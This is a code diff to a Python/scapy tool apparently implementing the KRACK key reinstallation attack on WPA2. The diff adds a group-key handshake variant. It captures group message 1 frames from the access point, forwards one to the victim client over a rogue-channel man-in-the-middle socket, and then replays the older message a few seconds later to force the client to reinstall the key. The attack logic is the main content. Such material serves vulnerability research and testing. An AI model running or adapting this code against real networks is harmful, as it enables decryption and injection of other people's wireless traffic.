@@ -169,6 +169,11 @@ def dot11_get_iv(p):
 	else:
 		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (ord(wep.iv[2]) << 16)
 
+def dot11_get_tid(p):
+	if Dot11QoS in p:
+		return ord(str(p[Dot11QoS])[0]) & 0x0F
+	return 0
+
 def dot11_is_group(p):
 	# TODO: Detect if multicast bit is set in p.addr1
 	return p.addr1 == "ff:ff:ff:ff:ff:ff"
@@ -345,6 +350,7 @@ rsn_ptksa_counters={ptksa_counters}
 rsn_gtksa_counters={gtksa_counters}
 
 wmm_enabled={wmmenabled}
+wmm_advertised={wmmadvertised}
 hw_mode=g
 auth_algs=3
 wpa_passphrase=XXXXXXXX"""
@@ -359,6 +365,7 @@ wpa_passphrase=XXXXXXXX"""
 			pairwise = " ".join([ciphers2str[idx] for idx in self.pairwise_ciphers]),
 			ptksa_counters = (self.capab & 0b001100) >> 2,
 			gtksa_counters = (self.capab & 0b110000) >> 4,
+			wmmadvertised = int(args.group),
 			wmmenabled = self.wmmenabled)
 
 
@@ -458,6 +465,10 @@ class KRAckAttack():
 		self.last_real_beacon = None
 		self.last_rogue_beacon = None
 
+		# To attack/test the group key handshake
+		self.group1 = []
+		self.time_forward_group1 = None
+
 	def hostapd_rx_mgmt(self, p):
 		log(DEBUG, "Sent frame to hostapd: %s" % dot11_to_str(p))
 		self.hostapd_ctrl.request("RX_MGMT " + str(p[Dot11]).encode("hex"))
@@ -531,7 +542,7 @@ class KRAckAttack():
 
 		return True
 
-	def handle_toclient_pairwise(self, client, p):
+	def handle_to_client_pairwise(self, client, p):
 		if args.group: return False
 
 		eapolnum = get_eapol_msgnum(p)
@@ -552,7 +563,7 @@ class KRAckAttack():
 		return False
 
 	def handle_from_client_pairwise(self, client, p):
-		if args.group: return False
+		if args.group: return
 
 		# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes				
 		plaintext = "\xaa\xaa\x03\x00\x00\x00"
@@ -589,6 +600,30 @@ class KRAckAttack():
 			client.update_state(ClientState.Failed)
 
 		client.save_iv_keystream(iv, keystream)
+
+	def handle_to_client_groupkey(self, client, p):
+		if not args.group: return False
+
+		# Does this look like a group key handshake frame -- FIXME do not hardcode the TID
+		if Dot11WEP in p and p.addr2 == self.apmac and p.addr3 == self.apmac and dot11_get_tid(p) == 7:
+			# TODO: Detect that it's not a retransmission
+			self.group1.append(p)
+			log(STATUS, "Queued %s group message 1's" % len(self.group1), showtime=False)
+			if len(self.group1) == 2:
+				log(STATUS, "Forwarding first group1 message", showtime=False)
+				self.sock_rogue.send(self.group1.pop(0))
+
+				self.time_forward_group1 = time.time() + 3
+
+			return True
+		return False
+
+	def handle_from_client_groupkey(self, client, p):
+		if not args.group: return
+	
+		# Does this look like a group key handshake frame -- FIXME do not hardcode the TID
+		if Dot11WEP in p and p.addr1 == self.apmac and p.addr3 == self.apmac and dot11_get_tid(p) == 7:
+			log(STATUS, "Got a likely group message 2", showtime=False)
 
 
 	def handle_rx_realchan(self):
@@ -663,7 +698,10 @@ class KRAckAttack():
 					client = self.clients[p.addr1]
 
 					# Note: could be that client only switching to rogue channel before receiving Msg3 and sending Msg4
-					if self.handle_toclient_pairwise(client, p):
+					if self.handle_to_client_pairwise(client, p):
+						pass
+
+					elif self.handle_to_client_groupkey(client, p):
 						pass
 
 					elif Dot11Deauth in p:
@@ -731,7 +769,7 @@ class KRAckAttack():
 				if Dot11WEP in p:
 					# Use encrypted frames to determine if the key reinstallation attack succeeded
 					self.handle_from_client_pairwise(client, p)
-
+					self.handle_from_client_groupkey(client, p)
 
 				if will_forward:
 					# Don't mark client as sleeping when we haven't got two Msg3's and performed the attack
@@ -877,6 +915,12 @@ class KRAckAttack():
 			if self.sock_real      in sel[0]: self.handle_rx_realchan()
 			if self.sock_rogue     in sel[0]: self.handle_rx_roguechan()
 			if self.hostapd.stdout in sel[0]: self.handle_hostapd_out()
+
+			if self.time_forward_group1 and self.time_forward_group1 <= time.time():
+				p = self.group1.pop(0)
+				self.sock_rogue.send(p)
+				self.time_forward_group1 = None
+				log(STATUS, "Injected older group message 1: %s" % dot11_to_str(p), color="green")
 
 			while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
 				self.send_disas(self.disas_queue.pop()[1])
